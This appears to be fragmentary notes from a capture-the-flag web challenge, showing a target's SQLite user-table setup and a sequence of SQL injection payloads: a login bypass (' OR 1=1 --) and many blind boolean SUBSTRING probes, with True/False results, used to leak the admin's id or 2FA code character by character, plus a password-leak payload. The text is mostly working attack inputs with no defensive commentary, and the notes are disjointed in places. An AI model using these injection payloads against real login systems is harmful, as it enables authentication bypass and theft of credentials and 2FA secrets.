username=admin&password=%3B+OR+1%3D1+--
b.run("CREATE TABLE IF NOT EXISTS Users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, code TEXT)");
    db.run("INSERT INTO Users (username, password, code) VALUES ('admin', ?, ?)", ADMIN_PASSWORD, ADMIN_2FA_CODE);
    db.run("INSERT INTO Users (username, password, code) VALUES ('guest', 'guest', '99999999999999')");

Stage 1:

admin

' OR 1=1 --



Trying to leak 2FA code
```
' OR SUBSTRING(id, 1, 1) < '5' -- True
' OR SUBSTRING(id, 1, 1) > '3' -- False
' OR SUBSTRING(id, 1, 1) > '1' -- False
' OR SUBSTRING(id, 1, 1) > '0' -- True
Now leak 1
' OR SUBSTRING(id, 2, 1) < '5' -- True
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 2, 1) > '3' -- False
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 2, 1) > '1' -- False
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 2, 1) > '0' -- False
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 2, 1) < '1' -- True
Now leak 10
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 3, 1) > '5' -- False
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 3, 1) > '3' -- False
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 3, 1) > '1' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 3, 1) < '1' -- T
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 3, 1) > '0' -- F
Now leak 100
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 4, 1) > '5' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 4, 1) > '3' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 4, 1) > '1' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 4, 1) > '0' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 4, 1) < '1' -- T
1000
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 5, 1) > '5' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 5, 1) > '3' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 5, 1) > '1' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 5, 1) > '0' -- F
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 5, 1) < '1' -- T
10000
' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 6, 1) > '5' --

```
How can I bypass admin 2FA?


' OR SUBSTRING((SELECT id FROM Users WHERE username = 'admin'), 2, 1) < '5' --


xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm